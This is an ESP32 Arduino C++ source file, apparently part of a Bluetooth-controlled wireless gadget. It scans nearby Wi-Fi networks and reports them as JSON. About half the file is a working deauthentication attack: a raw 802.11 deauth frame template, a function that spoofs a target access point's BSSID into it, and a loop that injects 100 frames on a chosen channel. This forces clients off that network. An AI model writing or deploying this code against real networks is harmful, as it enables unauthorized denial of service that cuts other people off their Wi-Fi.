#include <WiFi.h>
#include "esp_wifi.h"
#include "wifi_tools.h"
#include <ArduinoJson.h>

// Declare the notification function from ble_comms.cpp
void sendBleNotification(std::string message);

void initWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  Serial.println("Wi-Fi Initialized in Station Mode");
}

void runWifiScan() {
    Serial.println("Scanning for networks...");
    int n = WiFi.scanNetworks();
    Serial.printf("%d networks found.\n", n);

    // Create a JSON document to hold the results
    JsonDocument doc;
    JsonArray networks = doc.to<JsonArray>();

    // Limit to the top 5 to avoid sending too much data
    for (int i = 0; i < n && i < 5; ++i) {
        JsonObject network = networks.add<JsonObject>();
        network["ssid"] = WiFi.SSID(i);
        network["rssi"] = WiFi.RSSI(i);
        network["ch"] = WiFi.channel(i);
    }

    // Serialize the JSON document to a string
    std::string output;
    serializeJson(doc, output);

    // Send the JSON string as a notification
    sendBleNotification(output);
}

uint8_t deauth_frame_template[] = {
    0xc0, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
};

void sendDeauthPacket(const uint8_t* bssid) {
    uint8_t deauth_frame[sizeof(deauth_frame_template)];
    memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame_template));
    memcpy(&deauth_frame[10], bssid, 6);
    memcpy(&deauth_frame[16], bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
}

void startDeauthAttack(const uint8_t* bssid, int channel) {
    Serial.printf("Starting Deauth Attack on channel %d\n", channel);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    for (int i = 0; i < 100; i++) {
      sendDeauthPacket(bssid);
      delay(5);
    }
    Serial.println("Attack demo finished.");
}